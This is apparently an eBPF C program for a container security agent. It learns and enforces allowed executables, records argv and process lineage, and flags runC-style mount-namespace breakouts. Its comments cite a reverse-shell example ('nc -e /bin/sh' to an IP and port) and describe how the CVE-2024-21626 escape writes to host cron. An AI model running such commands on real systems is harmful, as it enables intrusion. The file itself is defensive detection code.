//go:build ignore

/*
 * Process execution monitoring + enforcement (CO-RE) via the BPF LSM
 * bprm_check_security hook, which fires on execve with the resolved binary.
 *
 * Like the file and network monitors, it learns the set of executables a
 * container runs during the learning window and, under enforcement, denies
 * exec of any unlearned binary with -EPERM - stopping reverse shells, dropped
 * miners, and other unexpected processes at the moment they try to start.
 * Requires a kernel with the bpf LSM active.
 *
 * Copyright 2025. Licensed under the Apache License, Version 2.0.
 */

#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include "enforce.h"

char LICENSE[] SEC("license") = "GPL";

#define PATH_MAX_LEN 128
#define MODE_LEARN 0
#define MODE_ENFORCE 1

/* Depth of the recorded process lineage, not counting the execing process
 * itself. Four is enough for the chains that matter in a container -
 * entrypoint -> shell -> tool -> child - and the walk has to be a bounded loop
 * for the verifier anyway. Each level costs 20 bytes in the event. */
#define ANCESTRY_DEPTH 4

/* Captured argv. 256 bytes is a power of two, which is what lets the verifier
 * prove the bounded write below, and it holds a realistic command line; longer
 * ones are truncated rather than dropped. Arguments are NUL separated, exactly
 * as /proc/<pid>/cmdline presents them. */
#define ARGS_MAX  256
#define ARGS_COUNT 20
/* Bytes the verifier is told each read may consume. Passing a variable size
 * derived from the running offset is rejected ("R1 max value is outside of the
 * allowed memory range") because the verifier cannot correlate the two; a
 * constant size plus an explicit bound on the index is the shape it can prove.
 * The offset still advances by the bytes actually read, so nothing is wasted -
 * this only caps a single argument at ARG_CHUNK-1 characters. */
#define ARG_CHUNK 64

/* Context layouts for the syscall entry tracepoints. Using the tracepoints
 * rather than a raw tracepoint over pt_regs keeps this architecture neutral:
 * PT_REGS_PARM*_CORE_SYSCALL casts to struct user_pt_regs, which does not
 * exist in an x86-derived vmlinux.h and so breaks the arm64 build. The
 * tracepoint hands us the arguments already extracted. */
struct execve_tp_ctx {
	__u64 __pad_common;
	__s32 __syscall_nr;
	__u32 __pad;
	const char *filename;
	const char *const *argv;
	const char *const *envp;
};

struct execveat_tp_ctx {
	__u64 __pad_common;
	__s32 __syscall_nr;
	__u32 __pad;
	__s64 fd;
	const char *filename;
	const char *const *argv;
	const char *const *envp;
	__s64 flags;
};

struct exec_args {
	__u32 argc;            /* arguments actually captured, not argc as passed */
	__u32 len;             /* bytes used in buf */
	__u8  truncated;       /* 1 when the command line did not fit */
	__u8  buf[ARGS_MAX];
};

struct ancestor {
	__u32 pid;      /* tgid; 0 marks the end of the chain */
	__u8  comm[16];
};

struct exec_event {
	__u64 cgroup_id;
	__u64 timestamp_ns;
	__u32 pid;  /* tgid */
	__u32 ppid; /* parent tgid: kept as its own field so existing consumers
		     * do not have to understand the ancestry array. Equal to
		     * ancestry[0].pid. */
	__u32 uid;
	__u32 flags; /* bit 0x80000000 => denied, 0x40000000 => killed,
		      * 0x20000000 => this is an exit, not an exec */
	__u8  comm[16];
	__u8  pcomm[16]; /* parent comm; equal to ancestry[0].comm */
	/* Full lineage, nearest ancestor first. A denial is far more actionable
	 * as "nginx -> sh -> curl" than as "curl was denied". */
	struct ancestor ancestry[ANCESTRY_DEPTH];
	__u8  filename[PATH_MAX_LEN];
	/* Working directory at exec. "nc run from /tmp" and "nc run from the app's
	 * install dir" are different findings, and both comparators report it. */
	__u8  cwd[PATH_MAX_LEN];
	/* NUL separated argv, captured at sys_enter. */
	__u32 args_count;
	__u32 args_len;
	__u8  args_truncated;
	__u8  args[ARGS_MAX];
};

struct {
	__uint(type, BPF_MAP_TYPE_RINGBUF);
	__uint(max_entries, 1 << 18); /* 256 KiB; events are deduped in-kernel */
} exec_events SEC(".maps");

/* argv captured at sys_enter, consumed by bprm_check in the same syscall.
 *
 * The LSM hook cannot read argv itself: by the time it runs the strings live in
 * the new mm being constructed, and bpf_probe_read_user reads the current
 * address space. At sys_enter we are still in the caller's, where argv is a
 * plain userspace pointer. Both run in the same task within the same execve, so
 * the pid_tgid key needs no correlation window and the entry is deleted on
 * consumption. The LRU bounds what a failed exec leaves behind. */
struct {
	__uint(type, BPF_MAP_TYPE_LRU_HASH);
	__type(key, __u64);
	__type(value, struct exec_args);
	__uint(max_entries, 1 << 10);
} exec_args_scratch SEC(".maps");

/* One scratch entry per CPU to build into: struct exec_args is far too large
 * for the 512-byte BPF stack. */
struct {
	__uint(type, BPF_MAP_TYPE_PERCPU_ARRAY);
	__type(key, __u32);
	__type(value, struct exec_args);
	__uint(max_entries, 1);
} exec_args_build SEC(".maps");

/* Learned allow-set: key = cgroup_id ^ FNV(filename). */
struct {
	__uint(type, BPF_MAP_TYPE_LRU_HASH);
	__type(key, __u64);
	__type(value, __u8);
	/* Containers execute few distinct binaries; LRU evicts the tail. */
	__uint(max_entries, 1 << 13);
} exec_allowed SEC(".maps");

/* Per-cgroup enforcement action, packed: see bpf/enforce.h. Absent or zero is
 * ACT_LEARN. This map used to hold a bare mode byte where 2 meant "enforce and
 * kill"; that value is still ACT_KILL, so the meaning of the low byte did not
 * change when the rest of the word was given a job. */
struct {
	__uint(type, BPF_MAP_TYPE_HASH);
	__type(key, __u64);
	__type(value, __u32);
	__uint(max_entries, 1 << 13); /* cgroups under policy on one node */
} exec_mode SEC(".maps");

/* Process filter.
 *
 * The learned allow-set answers "has this container run this binary before".
 * A policy's syscallPolicy.processFilter asks a different question: who is
 * allowed to run it. The two are independent - a binary the container has run
 * a thousand times is still not one that should be launched by a shell that
 * arrived over the network, or run as root when the workload runs as uid 1000.
 *
 * Each dimension is opt-in per cgroup, because an unset dimension must not
 * become an empty allow-list that denies everything. exec_filter_on carries the
 * bitmask of dimensions the policy actually specified; a dimension that is off
 * is not consulted at all.
 */
#define FILTER_PARENT 0x01
#define FILTER_UID    0x02
#define FILTER_GID    0x04

struct {
	__uint(type, BPF_MAP_TYPE_HASH);
	__type(key, __u64); /* cgroup_id */
	__type(value, __u8); /* FILTER_* bitmask */
	__uint(max_entries, 1 << 13);
} exec_filter_on SEC(".maps");

/* Allowed values for the enabled dimensions.
 *
 * One map rather than three: the key already carries the dimension, and three
 * maps would triple the per-node memory floor to hold the same handful of
 * entries. The kind is folded in multiplicatively so that a uid and a parent
 * hash that happen to collide numerically do not alias. */
#define KIND_PARENT 1ULL
#define KIND_UID    2ULL
#define KIND_GID    3ULL
#define KIND_MIX    0x9E3779B97F4A7C15ULL

struct {
	__uint(type, BPF_MAP_TYPE_LRU_HASH);
	__type(key, __u64);
	__type(value, __u8);
	__uint(max_entries, 1 << 13);
} exec_filter_allowed SEC(".maps");

static __always_inline __u64 filter_key(__u64 cgroup_id, __u64 kind, __u64 value)
{
	return cgroup_id ^ (kind * KIND_MIX) ^ value;
}

static __always_inline __u64 hash_name(const __u8 *p, int n)
{
	__u64 h = 1469598103934665603ULL;
	for (int i = 0; i < n; i++) {
		if (p[i] == 0)
			break;
		h ^= p[i];
		h *= 1099511628211ULL;
	}
	return h;
}

/* EV_BREAKOUT marks an exec whose working directory lives in a different mount
 * namespace from the process itself.
 *
 * That is the invariant the runC breakout class violates. CVE-2024-21626 and
 * the vulnerabilities that followed work by leaving the container's working
 * directory on a file descriptor the runtime leaked from the host mount
 * namespace; everything the container then resolves relative to it resolves on
 * the host, so a write to ../../../etc/cron.d escapes with no capability, no
 * mount, and no syscall a seccomp profile would question.
 *
 * The first version of this check looked for a working directory matching
 * /proc/self/fd/, which is how the exploit is usually *written*. That was
 * wrong, and a VM test said so: the kernel stores the resolved directory, so
 * chdir through a procfs symlink leaves fs->pwd pointing at the target, and
 * the string never appears. The namespace comparison is the property itself
 * rather than a spelling of it, and it holds however the descriptor was
 * obtained.
 *
 * A process whose working directory is outside its own mount namespace is not
 * a workload doing something unusual. There is no legitimate way to reach that
 * state from inside a container.
 */
#define EV_BREAKOUT 0x08000000u

static __always_inline int cwd_escapes_mount_ns(void)
{
	struct task_struct *task = bpf_get_current_task_btf();
	if (!task)
		return 0;

	/* The namespace the process belongs to. */
	struct nsproxy *ns = BPF_CORE_READ(task, nsproxy);
	if (!ns)
		return 0;
	struct mnt_namespace *task_ns = BPF_CORE_READ(ns, mnt_ns);
	if (!task_ns)
		return 0;

	/* The namespace the working directory's mount belongs to. fs->pwd.mnt is
	 * the vfsmount embedded in a struct mount, so the containing struct is
	 * reached by subtracting the member offset - the kernel's own
	 * real_mount(). */
	struct fs_struct *fs = BPF_CORE_READ(task, fs);
	if (!fs)
		return 0;
	struct vfsmount *vm = BPF_CORE_READ(fs, pwd.mnt);
	if (!vm)
		return 0;

	struct mount *m = (struct mount *)((char *)vm - offsetof(struct mount, mnt));
	struct mnt_namespace *pwd_ns = BPF_CORE_READ(m, mnt_ns);
	if (!pwd_ns)
		return 0;

	/* Equal is the overwhelmingly common case and costs one comparison. */
	return pwd_ns != task_ns;
}

/* EV_EXITED marks a record as a process exit rather than an exec. Exits ride
 * the same ring buffer and the same struct: a separate buffer would need its
 * own reader, its own decode path and its own metrics for no benefit, and the
 * fields that matter on an exit (pid, comm, cgroup, timestamp) are the ones an
 * exec already carries. */
#define EV_EXITED 0x20000000u

static __always_inline void fill_exit_parent(struct exec_event *e)
{
	struct task_struct *task = (struct task_struct *)bpf_get_current_task();
	if (!task)
		return;
	struct task_struct *parent = BPF_CORE_READ(task, real_parent);
	if (!parent)
		return;
	e->ppid = BPF_CORE_READ(parent, tgid);
	bpf_probe_read_kernel_str(e->pcomm, sizeof(e->pcomm), BPF_CORE_READ(parent, comm));
}

/* Report process exit, which is what lets a lifetime be computed and a pid be
 * retired rather than assumed still live. Attached to the scheduler tracepoint
 * because it fires for every task teardown, including one killed by the exec
 * enforcement above. */
struct sched_exit_ctx {
	__u64 __pad_common;
	__u8  comm[16];
	__u32 pid;
	__s32 prio;
};

SEC("tracepoint/sched/sched_process_exit")
int handle_sched_exit(struct sched_exit_ctx *ctx)
{
	__u64 pid_tgid = bpf_get_current_pid_tgid();
	__u32 tgid = pid_tgid >> 32;
	if (tgid == 0)
		return 0;
	/* Only the thread group leader's exit is the process exiting; reporting
	 * every thread would flood the buffer with events nothing acts on. */
	if ((__u32)pid_tgid != tgid)
		return 0;

	/* An exit outside a container is not this agent's business, and the
	 * unattributed volume would dwarf everything else on a node. */
	__u64 cgroup_id = bpf_get_current_cgroup_id();

	struct exec_event *e = bpf_ringbuf_reserve(&exec_events, sizeof(*e), 0);
	if (!e)
		return 0;

	__builtin_memset(e, 0, sizeof(*e));
	e->cgroup_id = cgroup_id;
	e->timestamp_ns = bpf_ktime_get_ns();
	e->pid = tgid;
	e->uid = (__u32)bpf_get_current_uid_gid();
	e->flags = EV_EXITED;
	bpf_get_current_comm(&e->comm, sizeof(e->comm));
	fill_exit_parent(e);
	bpf_ringbuf_submit(e, 0);
	return 0;
}

/* Capture argv on entry to execve/execveat.
 *
 * Arguments are what separate "nc ran" from "nc -e /bin/sh 10.0.0.1 4444", and
 * both comparators report them. This is the only point in the syscall where
 * argv is readable: it is a userspace pointer in the caller's address space,
 * and the LSM hook that follows runs against the new mm.
 */
static __always_inline int capture_args(const char *const *argv)
{
	if (!argv)
		return 0;

	__u64 pid_tgid = bpf_get_current_pid_tgid();
	if ((pid_tgid >> 32) == 0)
		return 0;

	__u32 zero = 0;
	struct exec_args *a = bpf_map_lookup_elem(&exec_args_build, &zero);
	if (!a)
		return 0;
	a->argc = 0;
	a->len = 0;
	a->truncated = 0;

	__u32 off = 0;
#pragma unroll
	for (int i = 0; i < ARGS_COUNT; i++) {
		const char *p = NULL;
		if (bpf_probe_read_user(&p, sizeof(p), &argv[i]) != 0 || !p)
			break;

		/* barrier_var stops the compiler re-deriving the index from `off` and
		 * hoisting the address computation above the bound check, which is why
		 * masking alone was still rejected: the verifier saw the original,
		 * unbounded value at the point of the write. */
		__u32 idx = off;
		barrier_var(idx);
		if (idx > ARGS_MAX - ARG_CHUNK) {
			a->truncated = 1;
			break;
		}
		long n = bpf_probe_read_user_str(&a->buf[idx], ARG_CHUNK, p);
		if (n <= 0)
			break;
		/* n includes the NUL, which becomes the separator between arguments,
		 * matching how /proc/<pid>/cmdline reads. */
		off = idx + (__u32)n;
		a->argc++;
		if ((__u32)n == ARG_CHUNK) {
			/* The argument filled the chunk, so it was cut short. */
			a->truncated = 1;
		}
	}

	a->len = off & (ARGS_MAX - 1);
	bpf_map_update_elem(&exec_args_scratch, &pid_tgid, a, BPF_ANY);
	return 0;
}

SEC("tracepoint/syscalls/sys_enter_execve")
int handle_execve_args(struct execve_tp_ctx *ctx)
{
	return capture_args(ctx->argv);
}

SEC("tracepoint/syscalls/sys_enter_execveat")
int handle_execveat_args(struct execveat_tp_ctx *ctx)
{
	return capture_args(ctx->argv);
}

SEC("lsm/bprm_check_security")
int BPF_PROG(bprm_check, struct linux_binprm *bprm, int ret)
{
	/* Respect a prior LSM denial in the chain. */
	if (ret != 0)
		return ret;

	__u64 pid_tgid = bpf_get_current_pid_tgid();
	__u32 tgid = pid_tgid >> 32;
	if (tgid == 0)
		return 0;

	__u64 cgroup_id = bpf_get_current_cgroup_id();

	struct exec_event *e = bpf_ringbuf_reserve(&exec_events, sizeof(*e), 0);
	if (!e)
		return 0;

	e->cgroup_id = cgroup_id;
	e->timestamp_ns = bpf_ktime_get_ns();
	e->pid = tgid;
	e->uid = (__u32)bpf_get_current_uid_gid();
	e->flags = 0;
	bpf_get_current_comm(&e->comm, sizeof(e->comm));

	/* Process ancestry: walk real_parent so a denial identifies the whole
	 * chain that led to it, not just the doomed child. The loop is bounded and
	 * fully unrolled, which is what the verifier requires. */
	e->ppid = 0;
	e->pcomm[0] = 0;
	__builtin_memset(e->ancestry, 0, sizeof(e->ancestry));
	{
		struct task_struct *task = (struct task_struct *)bpf_get_current_task();
#pragma unroll
		for (int i = 0; i < ANCESTRY_DEPTH; i++) {
			if (!task)
				break;
			struct task_struct *parent = BPF_CORE_READ(task, real_parent);
			if (!parent)
				break;
			__u32 ptgid = BPF_CORE_READ(parent, tgid);
			/* pid 0 is the idle task and every chain terminates at pid 1;
			 * recording past that is noise, and a task that is its own
			 * parent would otherwise spin out the unrolled loop. */
			if (ptgid == 0 || parent == task)
				break;
			e->ancestry[i].pid = ptgid;
			BPF_CORE_READ_STR_INTO(&e->ancestry[i].comm, parent, comm);
			if (i == 0) {
				e->ppid = ptgid;
				BPF_CORE_READ_STR_INTO(&e->pcomm, parent, comm);
			}
			if (ptgid == 1)
				break;
			task = parent;
		}
	}

	/* The binary being executed. */
	const char *fname = BPF_CORE_READ(bprm, filename);
	e->filename[0] = 0;
	if (fname)
		bpf_probe_read_kernel_str(e->filename, sizeof(e->filename), fname);

	/* Working directory. bpf_d_path is allowlisted per hook, so this may not
	 * verify on bprm_check_security; the field stays empty if the helper is
	 * unavailable rather than failing the load. */
	e->cwd[0] = 0;
	{
		/* bpf_d_path demands a trusted pointer. bpf_get_current_task_btf
		 * returns one, unlike the scalar from bpf_get_current_task. */
		struct task_struct *task = bpf_get_current_task_btf();
		if (task && task->fs) {
			long n = bpf_d_path(&task->fs->pwd, (char *)e->cwd, sizeof(e->cwd));
			if (n < 0)
				e->cwd[0] = 0;
		}
	}

	/* Attach the argv captured on entry to this same execve. */
	e->args_count = 0;
	e->args_len = 0;
	e->args_truncated = 0;
	e->args[0] = 0;
	{
		struct exec_args *a = bpf_map_lookup_elem(&exec_args_scratch, &pid_tgid);
		if (a) {
			e->args_count = a->argc;
			e->args_truncated = a->truncated;
			__u32 n = a->len;
			if (n > ARGS_MAX)
				n = ARGS_MAX;
			e->args_len = n;
			__builtin_memcpy(e->args, a->buf, ARGS_MAX);
			/* Consumed: leaving it would attach these arguments to whatever
			 * this pid execs next. */
			bpf_map_delete_elem(&exec_args_scratch, &pid_tgid);
		}
	}

	__u64 key = cgroup_id ^ hash_name(e->filename, sizeof(e->filename));

	__u32 *specp = bpf_map_lookup_elem(&exec_mode, &cgroup_id);
	__u32 spec = specp ? *specp : 0;
	__u8 action = ENFORCE_ACTION(spec);
	__u8 *known = bpf_map_lookup_elem(&exec_allowed, &key);

	/* The breakout check runs in every mode, including learning.
	 *
	 * Everything else here is a baseline question - has this container done
	 * this before - and the honest answer during learning is "it has now".
	 * This is not that: an exec from inside a leaked host file descriptor is
	 * never legitimate, so learning it would be learning the exploit. Under
	 * enforcement it is refused; while learning it is reported and, critically,
	 * not added to the allow-set. */
	int breakout = cwd_escapes_mount_ns();

	if (!action_learns(action)) {
		/* Two independent reasons to refuse: the binary was never learned, or
		 * the policy's process filter rejects who is running it. They are
		 * reported with different flag bits, because "this container has never
		 * run curl" and "curl may not be launched by sh" call for entirely
		 * different responses from whoever reads the event. */
		__u32 filter_deny = 0;
		__u64 uid_gid = bpf_get_current_uid_gid();
		__u8 *onp = bpf_map_lookup_elem(&exec_filter_on, &cgroup_id);
		__u8 on = onp ? *onp : 0;

		if (on & FILTER_PARENT) {
			__u64 k = filter_key(cgroup_id, KIND_PARENT,
					     hash_name(e->pcomm, sizeof(e->pcomm)));
			if (!bpf_map_lookup_elem(&exec_filter_allowed, &k))
				filter_deny = 1;
		}
		if (!filter_deny && (on & FILTER_UID)) {
			__u64 k = filter_key(cgroup_id, KIND_UID, (__u32)uid_gid);
			if (!bpf_map_lookup_elem(&exec_filter_allowed, &k))
				filter_deny = 1;
		}
		if (!filter_deny && (on & FILTER_GID)) {
			__u64 k = filter_key(cgroup_id, KIND_GID, uid_gid >> 32);
			if (!bpf_map_lookup_elem(&exec_filter_allowed, &k))
				filter_deny = 1;
		}

		if (known && !filter_deny && !breakout) {
			bpf_ringbuf_discard(e, 0);
			return 0;
		}
		if (filter_deny)
			e->flags |= 0x10000000; /* denied by the process filter */
		if (breakout)
			e->flags |= EV_BREAKOUT;

		/* A breakout is refused whatever the action says, ACT_AUDIT
		 * included. Every other question here is "has this container done
		 * this before", where an audit pass reporting instead of refusing
		 * is exactly what somebody rolling enforcement out wants. An exec
		 * from inside a leaked host file descriptor is not that question:
		 * it is never legitimate, and auditing it would mean watching the
		 * escape and letting it proceed. */
		if (breakout && ENFORCE_ACTION(spec) == ACT_AUDIT) {
			e->flags |= 0x80000000;
			bpf_ringbuf_submit(e, 0);
			return -1;
		}

		long ret = enforce_apply(spec, &e->flags, 0x80000000, 0x40000000);
		bpf_ringbuf_submit(e, 0);
		return ret;
	}

	/* Learning. A breakout is reported and deliberately not learned: adding it
	 * to the allow-set would make the exploit permanent for this cgroup. */
	if (breakout) {
		e->flags |= EV_BREAKOUT;
		bpf_ringbuf_submit(e, 0);
		return 0;
	}
	if (known) {
		bpf_ringbuf_discard(e, 0);
		return 0;
	}
	__u8 one = 1;
	bpf_map_update_elem(&exec_allowed, &key, &one, BPF_ANY);
	bpf_ringbuf_submit(e, 0);
	return 0;
}
